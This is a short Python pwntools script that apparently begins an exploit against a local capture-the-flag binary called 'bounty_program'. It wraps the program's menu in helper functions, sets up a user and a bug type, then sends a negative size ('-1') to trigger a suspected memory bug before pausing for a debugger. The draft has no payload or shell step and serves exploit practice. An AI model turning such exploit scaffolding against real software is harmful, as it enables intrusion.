from pwn import *

def login(username, password):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendafter(b'Username:',username)
    r.sendafter(b'Password:',password)

def logout():
   r.sendlineafter(b'Your choice: ',b'7') 

def register(username,password,contact) :
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'Username:',username)
    r.sendafter(b'Password:',password)
    r.sendafter(b'Contact:',contact)

def remove_user():
    r.sendlineafter(b'Your choice: ',b'5')

def add_new_product(name,company,comment):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendafter(b'Name of Product:',name)
    r.sendafter(b'Company:',company)
    r.sendafter(b'Comment:',comment)

def add_new_type(size, bug_type,price):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'Size:',str(size))
    r.sendafter(b'Type:', bug_type)
    r.sendafter(b'Price:',str(price))

def submit_bug_report(product_id, bug_type, title, bug_id, length, descripton):
    r.sendlineafter(b'Your choice: ',b'3')
    r.sendafter(b'Product ID:',str(product_id))
    r.sendafter(b'Type:',bug_type)
    r.sendafter(b'Title:',title)
    r.sendafter(b'ID:',str(bug_id))
    r.sendafter(b'Length of descripton:',str(length))
    r.sendafter(b'Descripton:',descripton)

def delete_bug_report(product_id, bug_id):
    r.sendlineafter(b'Your choice: ',b'8')
    r.sendafter(b'Product ID:',str(product_id))
    r.sendafter(b'Bug ID:',str(bug_id))

def change_password(new_password) :
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'password:',new_password)

r = process('./bounty_program')


register(b'123',b'a'*0xf, b'a'*0xf)
login(b'123',b'a'*0xf)
r.sendlineafter(b'Your choice: ',b'1') # bounty


add_new_type(0x38,b'1'*0x37,123456)

r.sendlineafter(b'Your choice: ',b'2')
input()     
r.sendafter(b'Size:',b'-1')
r.interactive()